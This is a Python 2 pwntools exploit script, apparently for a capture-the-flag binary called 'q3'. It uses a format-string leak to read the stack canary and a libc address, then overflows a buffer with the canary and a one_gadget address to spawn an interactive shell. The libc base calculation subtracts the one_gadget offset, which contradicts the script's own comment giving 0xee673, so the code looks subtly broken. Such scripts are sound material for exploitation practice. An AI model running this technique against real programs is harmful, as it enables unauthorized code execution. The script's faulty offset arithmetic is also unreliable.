#!/usr/bin/env python2
from pwn import *
#context_level='DEBUG'

#p = process("./q3", env={"LD_PRELOAD":"./libc.so.6"})
p = process("./q3")
elf = ELF("./q3", checksec=False)
libc = elf.libc

def main():

	# %11$lx - canary
	# 0xee673 - libc offset %3$lx
	# 0x45216 - one_gadget
	# 24 - canary offset

	p.sendline('%11$lx-%3$lx')
	p.recvline()
	leaks = p.recvline()

	stack_canary = int(leaks.split("-")[0], 16)
	libc.address = int(leaks.split("-")[1][:-1], 16) - 0x45216

	log.info('Canary: ' + hex(stack_canary))
	log.info('Libc Base: ' + hex(libc.address))

	system = libc.symbols['system']
	bin_sh = next(libc.search("/bin/sh\x00"))
	one_gadget = libc.address + 0x45216

	log.info('System: ' + hex(system))
	log.info('bin sh: ' + hex(bin_sh))
	log.info('One_gadget: ' + hex(one_gadget))

	payload = ""
	payload += "A"*24
	payload += p64(stack_canary)
	payload += "B"*8
	payload += p64(one_gadget)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
